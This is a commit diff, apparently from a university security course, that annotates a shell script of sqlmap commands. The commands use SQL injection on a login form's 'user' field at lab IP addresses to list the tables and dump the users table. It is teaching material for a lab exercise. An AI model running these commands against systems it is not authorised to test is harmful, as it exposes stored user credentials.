d920c6ccee18d2da9db61ff6d450ac7e775036b0
msauer-nmu <msauer@nmu.edu>
2024-09-24 13:40:38 -0400

    Added some notes to the shell script examples

--- assets/sqlmap.sh
+++ assets/sqlmap.sh
@@ -4,6 +4,9 @@ sqlmap -u "http://35.89.204.101:8080/index.php" --data="user=admin&password=admi
 # Yep!  Let's list the tables
 sqlmap -u "http://35.24.89.206:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --tables
 
-#Now that we know the table names, we can dump data
-
+#Now that we know the table names, we can dump data.  Let's dump the users table.
 sqlmap -u "http://35.24.114.101:8080/index.php" --data="user=admin&password=admin&s=OK" -p user --method POST --dump -T users
+
+# NOTE: If you are running sqlmap in a virtual machine and the Docker containers are running on the host OS you
+#       will need to replace the IP address with your host machine's IP.
+
